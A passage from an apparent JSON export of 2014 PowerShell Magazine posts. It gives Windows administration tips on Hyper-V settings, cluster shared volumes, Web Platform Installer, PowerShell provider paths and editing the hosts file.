editorial.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/04/jan-egil-ring-joins-powershell-magazine/","tags":["News"],"title":"Jan Egil Ring joins PowerShell Magazine"},{"categories":["Hyper-V","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nWhen working with Hyper-V in Windows Server 2012 or Windows 8 and higher, you can set various Hyper-V host settings via the Hyper-V Settings dialog. Every option under the “Server” section is settable via the Set-VMHost cmdlet.\nThe dialog also includes a “User” section. With this section you can control where keyboard key combination will run, which key combination will be used to release the mouse key (getting out of the VM window bounds), and more.\nHowever, User settings cannot be set using any of the Hyper-V cmdlets. They are a part of the Hyper-V Manager MMC snap-in. The Hyper-V Manager keeps tracking of its settings via a series of config files:\nPS\u0026gt; $path = \u0026quot;$env:APPDATA\\Microsoft\\Windows\\Hyper-V\\Client\\1.0\u0026quot; PS\u0026gt; Get-ChildItem $path Directory: C:\\Users\\shay\\AppData\\Roaming\\Microsoft\\Windows\\Hyper-V\\Client\\1.0 Mode LastWriteTime Length Name ---- ------------- ------ ---- -a--- 2/15/2014 12:22 PM 902 clientsettings.config -a--- 2/11/2014 10:06 PM 759 user.config -a--- 2/11/2014 10:06 PM 1511 virtmgmt.VMBrowser.config -a--- 2/5/2014 10:41 AM 622 vmconnect.config -a--- 12/2/2013 10:02 AM 1404 vmwizards.config The settings in the “User” section in Hyper-V Manager are stored in the clientsettings.config file. You can take a peek of the content with the Get-HVClientSettings function. Note that the file might not exist if you haven’t made a change to the “User” section in Hyper-V Manager. The values you get back are also version dependant. Prior to Server 2012 R2/Windows 8.1, you will only see the first two values. Additionally, there seems to be one setting that is missing from the UI, _‘UseAllMonitors’, _which I guess is probably related to the Remote Desktop Multimon feature available in Remote Desktop Client 7.0.\nfunction Get-HVClientSettings { $path = \u0026quot;$env:APPDATA\\Microsoft\\Windows\\Hyper-V\\Client\\1.0\\clientsettings.config\u0026quot; if(Test-Path $path) { $ClientSettings = Get-Content $path $settings = $ClientSettings.configuration.'Microsoft.Virtualization.Client.ClientVirtualizationSettings' $settings.setting } else { Write-Error \u0026quot;'$path' was not found\u0026quot; } } PS\u0026gt; Get-HVClientSettings | Select-Object Name,Value name value ---- ----- VMConnectKeyboardOption Remote VMConnectReleaseKey Shift VMConnectUseEnhancedMode True DesktopSize 1366, 768 UseAllMonitors True  As already stated, none of the above can be changed using the Hyper-V module. But now that you know where the settings reside…\nHere’s a function that will help you automate the update of User settings.\nfunction Set-HVClientSettings { [CmdletBinding()] param( [ValidateSet('Remote','Local','FullScreen')] [string]$ConnectKeyboardOption, [ValidateSet('LeftArrow','RightArrow','Space','Shift')] [string]$ReleaseKey, [bool]$UseEnhancedMode, [bool]$UseAllMonitors, [switch]$RestartClient ) $requiredVersion = $PSVersionTable.BuildVersion -lt '6.3.9600' $path = \u0026quot;$env:APPDATA\\Microsoft\\Windows\\Hyper-V\\Client\\1.0\\clientsettings.config\u0026quot; if(Test-Path $path) { $ClientSettings = Get-Content $path $settings = $ClientSettings.configuration.'Microsoft.Virtualization.Client.ClientVirtualizationSettings' if($ConnectKeyboardOption) { $settings.SelectSingleNode(\u0026quot;//setting[@name='VMConnectKeyboardOption']\u0026quot;).value = $ConnectKeyboardOption } if($PSCmdlet.MyInvocation.BoundParameters.ContainsKey('UseEnhancedMode')) { if($requiredVersion) { Write-Warning \u0026quot;'UseEnhancedMode' is available only in Windows 8.1/Windows server 2012 R2 and higher.\u0026quot; } else { $settings.SelectSingleNode(\u0026quot;//setting[@name='VMConnectUseEnhancedMode']\u0026quot;).value = \u0026quot;$UseEnhancedMode\u0026quot; } } if($PSCmdlet.MyInvocation.BoundParameters.ContainsKey('UseAllMonitors')) { if($requiredVersion) { Write-Warning \u0026quot;'UseAllMonitors' is available only in Windows 8.1/Windows server 2012 R2 and higher.\u0026quot; } else { $settings.SelectSingleNode(\u0026quot;//setting[@name='UseAllMonitors']\u0026quot;).value = \u0026quot;$UseAllMonitors\u0026quot; } } if($ReleaseKey) { $settings.SelectSingleNode(\u0026quot;//setting[@name='VMConnectReleaseKey']\u0026quot;).value = $ReleaseKey -replace 'arrow' } $ClientSettings.Save($path) if($RestartClient) { Get-Process | Where-Object MainWindowTitle -eq 'Hyper-V Manager' | Stop-Process -Force if(Test-Path \u0026quot;$env:ProgramFiles\\Hyper-V\\virtmgmt.msc\u0026quot;) { # 2008 R2 location \u0026amp; \u0026quot;$env:ProgramFiles\\Hyper-V\\virtmgmt.msc\u0026quot; } else { virtmgmt.msc } } } else { Write-Error \u0026quot;'$path' was not found\u0026quot; } }  The function also supports the option to restart Hyper-V Manager as changes will only apply to new instances of virtual machine connections.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/03/pstip-setting-hyper-v-client-settings/","tags":["Hyper-V","Tips and Tricks"],"title":"#PSTip Setting Hyper-V client settings"},{"categories":["Hyper-V","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nThere are several ways to test if a computer object is a virtual machine. Most, if not all, methods require a connection to each computer, usually by checking a WMI property. If the computer you are targeting is not available, this information will not be available as well.What if you wanted to get the information from a single location, such as Active Directory? When it comes to Hyper-V based VMs, you can.\nWhen a Hyper-V virtual machine is added to Active Directory, a serviceConnectionPoint (SCP) object called _“Windows Virtual Machine” _is created under the computer object account (the object is created by the Hyper-V Integration service “Hyper-V Heartbeat Service”). We can use the “Windows Virtual Machine” object to identify Windows Hyper-V virtual machines.\nPS\u0026gt; Get-ADObject -Filter {objectClass -eq 'serviceConnectionPoint' -and Name -eq 'Windows Virtual Machine'} DistinguishedName Name ObjectClass ObjectGUID ----------------- ---- ----------- ---------- CN=Windows Virtual Machine,CN=server1... Windows Virtual Machine serviceConnectionPoint d4d935cf-1310-4b6b-967d-469a9da1a88d CN=Windows Virtual Machine,CN=server2... Windows Virtual Machine serviceConnectionPoint e60feb40-794a-4237-99af-1b1ef33f2984 CN=Windows Virtual Machine,CN=server3... Windows Virtual Machine serviceConnectionPoint 53107864-ae4f-478c-a76c-fc0675a6d1b8 (...) Getting the virtual machine name is a bit tricky. You could parse the machine name from the DistinguishedName property but there’s an easier way. If you include the CanonicalName property you can quickly split it and get the name\nGet-ADObject -Filter {objectClass -eq 'serviceConnectionPoint' -and Name -eq 'Windows Virtual Machine'} -Properties CanonicalName | ForEach-Object{ $_.CanonicalName.Split('/')[-2] } Server1 Server2 Server3 (...) ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/28/pstip-how-to-identify-hyper-v-virtual-machines/","tags":["Hyper-V","Tips and Tricks"],"title":"#PSTip How to identify Hyper-V virtual machines"},{"categories":["How To","Hyper-V"],"contents":"The Failover Cluster cmdlets can be used to get information about Cluster Shared Volumes (CSV). The Get-ClusterSharedVolume cmdlet when run on a cluster node, gives us the information about all the CSVs.\nPS\u0026gt; Get-ClusterSharedVolume Name State Node ---- ----- ---- VM-CSV Online SERVER-2 We can dig deep into the object returned by this cmdlet to find the total space allocated to the CSV and the freespace available.\nPS\u0026gt; $csv = Get-ClusterSharedVolume PS\u0026gt; $csv.SharedVolumeInfo.Partition Name : \\\\?\\Volume{6688b177-8da7-45ed-93d1-04d649925cd0}\\ DriveLetter : DriveLetterMask : 0 FileSystem : CSVFS FreeSpace : 1055810584576 MountPoints : {} PartitionNumber : 2 PercentFree : 48.01538 Size : 2198900506624 UsedSpace : 1143089922048 HasDriveLetter : False IsCompressed : False IsDirty : Unknown IsFormatted : True IsNtfs : False IsPartitionNumberValid : True IsPartitionSizeValid : True If you have noticed, the Get-ClusterSharedVolume cmdlet gives us the ownernode for the disk but it does not tell us what is the disk number. For reporting purposes, it is important for me to be able to accurately identify the physical disk number on the ownernode. This mapping is not straightforward. We can use a combination of Storage cmdlets and CIM cmdlets to create this mapping.\nFunction Get-CSVtoPhysicalDiskMapping { param ( [string]$clustername = \u0026amp;quot;.\u0026amp;quot; ) $clusterSharedVolume = Get-ClusterSharedVolume -Cluster $clusterName foreach ($volume in $clusterSharedVolume) { $volumeowner = $volume.OwnerNode.Name $csvVolume = $volume.SharedVolumeInfo.Partition.Name $cimSession = New-CimSession -ComputerName $volumeowner $volumeInfo = Get-Disk -CimSession $cimSession | Get-Partition | Select DiskNumber, @{ Name=\u0026amp;quot;Volume\u0026amp;quot;;Expression={Get-Volume -Partition $_ | Select -ExpandProperty ObjectId} } $csvdisknumber = ($volumeinfo | where { $_.Volume -eq $csvVolume}).Disknumber $csvtophysicaldisk = New-Object -TypeName PSObject -Property @{ \u0026amp;quot;CSVName\u0026amp;quot; = $volume.Name \u0026amp;quot;CSVVolumePath\u0026amp;quot; = $volume.SharedVolumeInfo.FriendlyVolumeName \u0026amp;quot;CSVOwnerNode\u0026amp;quot;= $volumeowner \u0026amp;quot;CSVPhysicalDiskNumber\u0026amp;quot; = $csvdisknumber \u0026amp;quot;CSVPartitionNumber\u0026amp;quot; = $volume.SharedVolumeInfo.PartitionNumber \u0026amp;quot;Size (GB)\u0026amp;quot; = [int]($volume.SharedVolumeInfo.Partition.Size/1GB) \u0026amp;quot;FreeSpace (GB)\u0026amp;quot; = [int]($volume.SharedVolumeInfo.Partition.Freespace/1GB) } $csvtophysicaldisk } }  As you see above, we are using the partition information in the CSV object to map it to a volume’s disk number on the physical host. For this, we are first retrieving all the disk information from the ownernode of the CSV volume. Once we have the disk information, we retrieve a list of partition and then map them to the volumes. What we are interested in here is really the ObjectId property of each volume.\nIn the CSV object’s partition information, the name of the partition is written in the form of a physical device path. In this example, _\\?\\Volume{6688b177-8da7-45ed-93d1-04d649925cd0}_ represents the volume’s ObjectId. All we need to do now is to compare the _ObjectId_s we retrieved to the CSV partitions volume name.\nPS\u0026gt; Get-CSVtoPhysicalDiskMapping FreeSpace (GB) : 983 CSVVolumePath : C:\\ClusterStorage\\Volume1 CSVOwnerNode : STOMP-SERVER-2 Size (GB) : 2048 CSVName : VM-CSV CSVPartitionNumber : 2 CSVPhysicalDiskNumber : 2 Once you have this information as a custom object, you can simply send this to the ConvertTo-Html cmdlet to create a HTML file. We can beautify the HTML formatting using custom CSS. More on that later!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/28/reporting-cluster-shared-volume-csv-disk-space-utilization/","tags":["How To","Hyper-V"],"title":"Reporting Cluster Shared Volume (CSV) disk space utilization"},{"categories":["News","WMI"],"contents":"Back in 2011, I published a free book on learning WMI Query Language (WQL) via PowerShell. It was a huge success. It had more than 48K downloads to this day. I have received lot of positive feedback from readers and even today I receive mails stating that it was very helpful. This book has content on the following topics.\n Introduction Tools for the job WMI Data queries WMI Event Queries: Introduction Intrinsic Event Queries Extrinsic Event Queries Timer Events WMI Schema Queries WMI Event consumers  Alan Forbes, the author of “The Joy of PHP“, asked me a while ago if he can convert this content into a Kindle compatible version. So, we went ahead and converted it into a mobi format. The content is polished and ready for you to read it on Kindle. It is available at $2.99 as of today.\nThis content is not updated to include CIM cmdlets, as the main intention of the book itself was showing how to use WQL rather than teaching about WMI cmdlets. PowerShell was the vehicle to learn WQL in this case.\nIf you have enjoyed reading the free book, please leave a review for this book on Amazon. If you decide to purchase this Kindle version, you are awesome! 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/28/wmi-query-language-via-powershell-available-on-kindle/","tags":["News","WMI"],"title":"WMI Query Language via PowerShell available on Kindle"},{"categories":["Hyper-V","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nVirtual Machine Connection Authorization allows users to connect to virtual machines using the VMConnect interface in Hyper-V (and Hyper-V RSAT tools). Virtual Machine Connection authorization is configured by a Hyper-V Administrator using the Grant-VMConnectAccess cmdlet.\nGrant-VMConnectAccess -VMName TestVM -UserName domain\\user1  VMConnect Authorization uses an Access Control List (ACL) that is placed inside the virtual machine configuration file. Access can also be revoked using Revoke-VMConnectAccess.\nRevoke-VMConnectAccess -VMName TestVM -UserName domain\\user1  With Get-VMConnectAccess you can determine which users have access to which virtual machines.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/27/pstip-hyper-v-vm-connection-authorization/","tags":["Hyper-V","Tips and Tricks"],"title":"#PSTip Hyper-V VM Connection Authorization"},{"categories":["How To"],"contents":"Web Platform Installer or Web PI is a free tool that makes getting the latest components of the Microsoft Web Platform, including Internet Information Services (IIS), SQL Server Express, .NET Framework and Visual Web Developer easy. The Web PI also makes it easy to install and run the most popular free web applications for blogging, content management and more with the built-in Windows Web Application Gallery. A lot of stuff that you want to do on Azure requires Web PI. For example, the Azure PowerShell cmdlets can be installed using Web PI.\nIn this article, I am going to show you how to use Web PI .NET interfaces in PowerShell.\nFirst of all, we need the Web Platform Installer. You can download and install it from http://www.microsoft.com/web/downloads/platform.aspx. Once you have Web PI installed, you can access its API by loading the Microsoft.Web.PlatformInstaller namespace.\n[reflection.assembly]::LoadWithPartialName(\"Microsoft.Web.PlatformInstaller\") | Out-Null  The ProductManager class provides access to the product feeds. We can use this class to list the products available for install using Web PI. We can create an instance of this class using the New-Object cmdlet.\n$ProductManager = New-Object Microsoft.Web.PlatformInstaller.ProductManager $ProductManager.Load() We need to load the default feed by calling the Load() method. It is not necessary to specify a URI as an argument here. It takes the value of DefaultFeed property and loads it. Once we load the default feed, we can see a list of products by accessing the Products property.\n$ProductManager.Products | Select Title, Version, Author | Out-GridView We can filter the list of product by using the ProductId property.\n$ProductManager.Products | Where-Object { $_.ProductId -like \u0026quot;*PowerShell*\u0026quot; } | Select Title, Version | Out-GridView Let us see an example of using Web PI to install a product. For the purpose of this demonstration, I will select Windows Azure PowerShell.\n$product = $ProductManager.Products | Where { $_.ProductId -eq \u0026quot;WindowsAzurePowerShell\u0026quot; } We need an instance of the InstallerManager class to perform the package install.\n$InstallManager = New-Object Microsoft.Web.PlatformInstaller.InstallManager $Language = $ProductManager.GetLanguage(\u0026quot;en\u0026quot;) $installertouse = $product.GetInstaller($Language) I have also set the language to English so that I get the right installer for my platform. We now need to get the installer for downloading and installing the package. Note that to be able to install packages, you need administrative privileges. So, if you are installing packages, you need to elevate the console.\n$installer = New-Object 'System.Collections.Generic.List[Microsoft.Web.PlatformInstaller.Installer]' $installer.Add($installertouse) $InstallManager.Load($installer) We have now setup the install manager for the right package. We can download the installer package by using the DownloadInstallerFile() method.\n$failureReason=$null foreach ($installerContext in $InstallManager.InstallerContexts) { $InstallManager.DownloadInstallerFile($installerContext, [ref]$failureReason) } Finally, we start the package installation by the StartInstallation() method.\n$InstallManager.StartInstallation() Once the installation is complete, the StartInstallation() method returns $true if everything is successful. You can review the logs at $Product.Installers[0].LogFiles. Here is the complete script that can install Azure PowerShell cmdlets using PowerShell and Web PI.\n[reflection.assembly]::LoadWithPartialName(\u0026quot;Microsoft.Web.PlatformInstaller\u0026quot;) | Out-Null $ProductManager = New-Object Microsoft.Web.PlatformInstaller.ProductManager $ProductManager.Load() $product = $ProductManager.Products | Where { $_.ProductId -eq \u0026quot;WindowsAzurePowerShell\u0026quot; } $InstallManager = New-Object Microsoft.Web.PlatformInstaller.InstallManager $Language = $ProductManager.GetLanguage(\u0026quot;en\u0026quot;) $installertouse = $product.GetInstaller($Language) $installer = New-Object 'System.Collections.Generic.List[Microsoft.Web.PlatformInstaller.Installer]' $installer.Add($installertouse) $InstallManager.Load($installer) $failureReason=$null foreach ($installerContext in $InstallManager.InstallerContexts) { $InstallManager.DownloadInstallerFile($installerContext, [ref]$failureReason) } $InstallManager.StartInstallation() ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/27/using-powershell-and-web-platform-installer-to-install-azure-powershell-cmdlets/","tags":["How To"],"title":""},{"categories":["Hyper-V","Tips and Tricks"],"contents":"Recently, I was troubleshooting an issue related to CSVs going offline randomly. In that process, I had to detect when a CSV goes offline and then analyse a few log files to find the root cause.\nFor monitoring CSV availability, I used the WMI events. Here is what I did.\n$query = \"Select * from __instanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'MSCluster_Resource' AND TargetInstance.Type='Physical Disk' AND TargetInstance.IsClusterSharedVolume='True' AND TargetInstance.State=3\" Register-WmiEvent -Namespace root\\mscluster -Query $query -Action { Write-Host \"CSV volume $($event.SourceEventArgs.NewEvent.TargetInstance.Name) went offline\" }  In the WMI query, I used an intrinsic event registration for the MSCluster_Resource Failover Cluster WMI class. So, whenever an instance of this class gets modified, we get notified. If you want to try bringing the CSV online, you can insert the following line of code into the -Action script block.\nStart-ClusterResource -Name $event.SourceEventArgs.NewEvent.TargetInstance.Name   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/26/pstip-monitoring-cluster-shared-volume-csv-availability/","tags":["Hyper-V","Tips and Tricks"],"title":"#PSTip Monitoring Cluster Shared Volume (CSV) availability"},{"categories":["How To"],"contents":"Why and how would the current path affect how cmdlets work? What exactly is the current path?\nI am sure you\u0026rsquo;ll be up for a bunch of surprises! Let me take you on a tour to the not-so-well-known intrinsics of PowerShell paths and providers. And yes, I\u0026rsquo;ll be covering some basics at the beginning, so PowerShell veterans, please hang in and read on. Off we go!\nCurrent Path – PowerShell Cares The current path is the path you are currently in (as you probably figured). But there are actually two current paths. PowerShell maintains one, and Windows does, too. And they behave completely different.\nFrom within PowerShell, you manage the current path with the family of *-Location cmdlets:\nPS\u0026gt; Set-Location -Path $home PS\u0026gt; Get-Location Path –––– C:\\Users\\Tobias PS\u0026gt; Set-Location -Path c:\\ PS\u0026gt; Get-Location Path –––– C:\\ Current Path for PowerShell\nNever heard of Set-Location? You may know Set-Location under one of its nicknames: the common alias is \u0026ldquo;cd\u0026rdquo;, and as you can see below, there are a couple more aliases you can use, so changing the current PowerShell folder must be an important thing:\nPS\u0026gt; Get-Command -Name cd CommandType Name ModuleName ––––––––––– –––– –––––––––– Alias cd –\u0026gt; Set-Location PS\u0026gt; Get-Alias –Definition Set-Location CommandType Name ModuleName ––––––––––– –––– –––––––––– Alias cd –\u0026gt; Set-Location Alias chdir –\u0026gt; Set-Location Alias sl –\u0026gt; Set-Location Set-Location is known under a bunch of alias names\nFirst important thing to note: changing the PowerShell current path does not affect the Windows current path at all, they are not synced, they are absolutely separate.\nThis one defaults to the working directory of your PowerShell host and does not change unless you change it explicitly:\nPS\u0026gt; [System.Environment]::CurrentDirectory C:\\Users\\Tobias PS\u0026gt; [System.Environment]::CurrentDirectory = 'c:\\admin' PS\u0026gt; [System.Environment]::CurrentDirectory c:\\admin PS\u0026gt; Get-Location Path –––– C:\\ Current Path for Windows\nPowerShell Path: Not Just FileSystem The PowerShell current path supports all the different PowerShell drives, so it can not only point to filesystem locations. This would set the current path to HKEY_CURRENT_USER in the Registry (again, no surprise to PowerShell veterans, but hold on a second for surprises):\nPS\u0026gt; Set-Location -Path HKCU:\\ PS\u0026gt; dir Hive: HKEY_CURRENT_USER Name Property –––– –––––––– AppEvents Console HistoryNoDup : 0 FullScreen : 0 ScrollScale : 1 ExtendedEditKeyCustom : 0 CursorSize : 25 FontFamily : 0 ScreenColors : 7 TrimLeadingZeros : 0 WindowSize : 1638480 LoadConIme : 1 PopupColors : 245 QuickEdit : 0 WordDelimiters : 0 ColorTable10 : 65280 ColorTable00 : 0 ColorTable11 : 16776960 ColorTable01 : 8388608 ColorTable12 : 255 ColorTable02 : 32768 ColorTable13 : 16711935 ColorTable03 : 8421376 ColorTable14 : 65535 EnableColorSelection : 0 ColorTable04 : 128 ColorTable15 : 16777215 ExtendedEditKey : 0 ColorTable05 : 8388736 ColorTable06 : 32896 ColorTable07 : 12632256 NumberOfHistoryBuffers : 4 ScreenBufferSize : 19660880 ColorTable08 : 8421504 ColorTable09 : 16711680 FontWeight : 0 HistoryBufferSize : 50 FontSize : 0 InsertMode : 1 CurrentPage : 1 Control Panel Environment TMP : C:\\Users\\Tobias\\AppData\\Local\\Temp TEMP : C:\\Users\\Tobias\\AppData\\Local\\Temp EUDC Identities Keyboard Layout Network Printers Software System Volatile Environment LOGONSERVER : \\\\MicrosoftAccount USERDOMAIN : TOBI2 USERNAME : Tobias USERPROFILE : C:\\Users\\Tobias HOMEPATH : \\Users\\Tobias HOMEDRIVE : C: APPDATA : C:\\Users\\Tobias\\AppData\\Roaming LOCALAPPDATA : C:\\Users\\Tobias\\AppData\\Local USERDOMAIN_ROAMINGPROFILE : TOBI2 PowerShell paths can point to any provider location, not just the filesystem\nSo you can set the PowerShell current path to any PSDrive that you (or your friendly modules) have set up:\nName Used (GB) Free (GB) Provider Root CurrentLocation –––– ––––––––– ––––––––– –––––––– –––– ––––––––––––––– Alias Alias C 74,55 362,30 FileSystem C:\\ Cert Certificate \\ D 8,45 16,55 FileSystem D:\\ Env Environment Function Function HKCU Registry HKEY_CURRENT_USER HKLM Registry HKEY_LOCAL_MACHINE Variable Variable WSMan WSMan PSDrives can all be targeted in PowerShell paths\nBehind The Scene: Provider Selector Each PSDrive gets its information from a \u0026ldquo;PSProvider\u0026rdquo;, and the name of the provider is listed in the \u0026ldquo;Provider\u0026rdquo; column.\nThe drive HKCU: for example comes from the provider \u0026ldquo;Registry\u0026rdquo;. And when you add more modules, they may bring additional providers (and PSDrives) – for example the module ActiveDirectory, and the modules for SQL Server.\nAnd now things become a little bit more mind-blowing: The current PowerShell path is actually a provider selector! It tells PowerShell which provider should be used by default if it cannot determine the appropriate provider elsehow.\nTest yourself! What smells funny about this code?\nPS\u0026gt; cd hkcu: PS\u0026gt; dir HKEY_CURRENT_USER\\Software\\Microsoft Hive: HKEY_CURRENT_USER\\Software\\Microsoft Name Property –––– –––––––– Active Setup ActiveMovie Advanced INF Setup ASF Stream Descriptor File ASP.NET Assistance AuthCookies Calc Window_Placement : {44, 0, 0, 0…} CharMap Advanced : 1 CodePage : Unicode Taking advantage of default provider selection\nRight: \u0026ldquo;dir\u0026rdquo; (aka Get-ChildItem) is dumping HKCU\\Software\\Microsoft from the Registry. It is NOT using a PowerShell drive. It is simply using a regular Registry path. So you could now open regedit.exe, right-click a key in HKEY_CURRENT_USER, copy its path name, paste it to PowerShell, and off you go.\nOnce you switch PowerShell default path, the line no longer works:\nPS\u0026gt; cd c:\\ PS\u0026gt; dir HKEY_CURRENT_USER\\Software\\Microsoft dir : Cannot find path 'C:\\HKEY_CURRENT_USER\\Software\\Microsoft' because it does not exist. At line:1 char:1 + dir HKEY_CURRENT_USER\\Software\\Microsoft + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : ObjectNotFound: (C:\\HKEY_CURRENT_USER\\Software\\M icrosoft:String) [Get-ChildItem], ItemNotFoundException + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetCh ildItemCommand The default provider controls how paths are interpreted\nSo the bottom line is:\nYou either use a PSDrive letter to explicitly have a path tied to a specific provider (Get-PSDrive listed the providers that are tied to particular drive letters).\nOr, when the path has no PSDrive letter, PowerShell takes the provider from the default PowerShell path.\nIf you do not care about this, one identical line of code can behave completely differently, depending on the current PowerShell default path.\nCheck this out:\nPS\u0026gt; cd c:\\ PS\u0026gt; Test-Path -Path \\\\storage1\\serviceshare True PS\u0026gt; cd hklm: PS\u0026gt; Test–Path –Path \\\\storage1\\serviceshare False Test-Path takes the provider from the default path when using UNC names\nSince a UNC path name starts with \u0026ldquo;\u0026quot; and not with a PSDrive, the path cannot be assigned to one specific provider.\nThus, PowerShell takes it from the default current path, and depending where you are, will interpret it completely different. In the first call, it is interpreted as a filesystem location (and since it is an existing UNC path, the result is TRUE).\nThe second call treats it like a Registry path, and it is not present, returning FALSE.\nUsing Unambiguous Paths One solution is to make paths unambiguous by adding the provider name that should be used. So to make the above example fool-proof, you could do this:\nPS\u0026gt; cd c:\\ PS\u0026gt; Test-Path -Path FileSystem::\\\\storage1\\serviceshare True PS\u0026gt; cd HKCU:\\ PS\u0026gt; Test-Path -Path FileSystem::\\\\storage1\\serviceshare True Adding provider name to a path makes it unambiguous\nThis is a very powerful technique because it lets you break out of the restrictions imposed by PSDrives, too.\nFor example, there are only two default drives representing the Registry hives HKLM and HKCU. What if you wanted to navigate a different hive?\nTry this:\nPS\u0026gt; dir Registry::HKEY_CURRENT_USER\\Console Hive: HKEY_CURRENT_USER\\Console Name Property –––– –––––––– %SystemRoot%_System32_WindowsP PopupColors : 243 owerShell_v1.0_powershell.exe FontFamily : 54 QuickEdit : 1 ColorTable05 : 5645313 ScreenBufferSize : 196608120 WindowSize : 2359416 ColorTable06 : 15789550 FontWeight : 400 ScreenColors : 86 FaceName : Consolas FontSize : 2949120 %SystemRoot%_SysWOW64_WindowsP PopupColors : 243 owerShell_v1.0_powershell.exe FontFamily : 54 QuickEdit : 1 ColorTable05 : 5645313 ScreenBufferSize : 196608120 WindowSize : 3276920 ColorTable06 : 15789550 FontWeight : 400 ScreenColors : 86 FaceName : Lucida Console PS\u0026gt; dir Registry:: Hive: Name Property –––– –––––––– HKEY_LOCAL_MACHINE HKEY_CURRENT_USER HKEY_CLASSES_ROOT (default) : HKEY_CURRENT_CONFIG HKEY_USERS HKEY_PERFORMANCE_DATA Global : {80, 0, 69, 0…} Costly : {80, 0, 69, 0…} Accessing the registry directly using the provider name\nBy prefixing the path with the provider name and two colons, you tell PowerShell to interpret the path in the context of this provider – without having to use a PSDrive.\nThis allows you to use native Registry paths (no need to exchange the hive with a PSDrive anymore), and it allows you to navigate anywhere, even the very root of the Registry.\nDynamic Parameters And there is more: each cmdlet certainly has its own set of parameters. In addition, though, it can expose additional parameters when a specific provider is targeted.\nCheck this out:\nPS\u0026gt; cd c:\\ PS\u0026gt; Get-ChildItem –File –ReadOnly Dynamic parameters are exposed for specific providers only\nIf the current path is a filesystem drive (or if you have submitted such a path to the -Path parameter of Get-ChildItem), the cmdlet exposes additional parameters such as -File (list files only) or -ReadOnly (list readonly items only, both were introduced in PowerShell 3.0). IntelliSense and tabcompletion will expose these.\nWhen you change default location (or provide a different path to -Path) to another provider, dynamic parameters may change or become unavailable.\nSo this would look for any codesigning certificates in your cert store that expire in 5 days:\nPS\u0026gt; cd cert:\\ PS\u0026gt; dir –CodeSigningCert –ExpiringInDays 5 –Recurse Dynamic parameters provided by certificate provider\n(the dynamic parameter -ExpiringInDays (and a bunch more) are available only in Windows 8/Server 2012 and above – which comes with an improved certificate provider)\nLikewise, to set a Registry value of a given type, you will only get tabcompletion and IntelliSense for the -Type dynamic parameter, when the path provided by you unambiguously targets the Registry provider.\nThis works (and creates a key HKCU:\\Software\\Test with a DWORD value named MyValue set to 2):\nPS\u0026gt; $null = New-Item -Path HKCU:\\Software\\Test PS\u0026gt; Set-ItemProperty -Path HKCU:\\Software\\Test -Name MyValue -Value 2 -Type DWord Creating Registry Key and Value\nWhile you type this in, you will get tabcompletion and IntelliSense for all parameters, including the -Type dynamic parameter.\nNow try and type this:\nPS\u0026gt; Set-ItemProperty -Path 'HKCU:\\Software\\Test' -Name MyValue -Value 3 -type dword No intellisense for -Type?\nThis time, you do not get tabcompletion for -Type. Funnily, Set-ItemProperty is unable to recognize quoted paths apparently. This smells a bit like a bug.\nProvider Selection: An Important Choice As you\u0026rsquo;ve seen, the current PowerShell path has important implications, and a number of modules make extensive use of this.\nFor example, ActiveDirectory takes the connection details to ActiveDirectory from the current AD drive you select. So to connect to different domains, DCs, or to use different credentials, you would have to add more PSDrives (New-PSDrive) where you specify the connection details.\nThen, by changing the default PowerShell path (Set-Location), you can switch back and forth between different connections and ADs.\nSimilar logic is found with SCCM and other products.\nSo the current PowerShell location is by no means just a type safer to allow you to use relative paths. It is also a default provider selector with many implications.\nSome of these you can circumvent by adding the provider name to your paths and making them unique and independent of the current PowerShell path.\nSo, that\u0026rsquo;s it for now, have fun and a great weekend!\nTobias\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/26/current-path-affects-cmdlets/","tags":["How To"],"title":"How Current Path Affects Cmdlets"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nOccasionally you need to make changes to the hosts file, either locally or remotely on another machine. There are times when you open the file, but when you try to save it you are presented with the “save as” dialog, which suggests that the text editor you are working with was not opened as an administrator. As a result, you are forced to close the file, reopen it with elevated editor, and make your changes again.\nFor that purpose I keep the Edit-HostsFile function in my profile. It takes care of elevation for me (assuming you have the appropriate permissions), making changes to hosts files has never been so easy.\nfunction Edit-HostsFile { param($ComputerName=$env:COMPUTERNAME) Start-Process notepad.exe -ArgumentList \\\\$ComputerName\\admin$\\System32\\drivers\\etc\\hosts -Verb RunAs }  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/02/25/pstip-editing-your-hosts-file/","tags":["Tips and Tricks"],"title":"#PSTip Editing your hosts file"},{"categories":["How To","Hyper-V"],"contents":"I’ve read recently a post by Hyper-V MVP Aidan Finn about a script he wrote to convert Hyper-V virtual machine VHDs to the new VHDX disk format. I liked what I saw and I gave the script a few spins in my lab. It worked flawlessly, but I wanted to create a more robust version–one that supports conversions of one or more local or remote virtual machine disks.\nThe ConvertTo-Vhdx advanced function is the result. It adds the missing functionality I was looking for as well as fixes a gotcha where a VM would shut down even if it had no disks to convert. The function accepts pipeline input of virtual machine objects as well as virtual machine names. It also adds support to run the function in WhatIf mode. When -WhatIf is specified, virtual machines are checked and messages are written to the console. The -DeleteSource switch parameter allows you to delete the source virtual hard disk(s) after the conversion, and -StartVM will turn on the virtual machine when conversion has finished.\nfunction ConvertTo-Vhdx { [CmdletBinding(DefaultParameterSetName='name',SupportsShouldProcess=$true)] param( 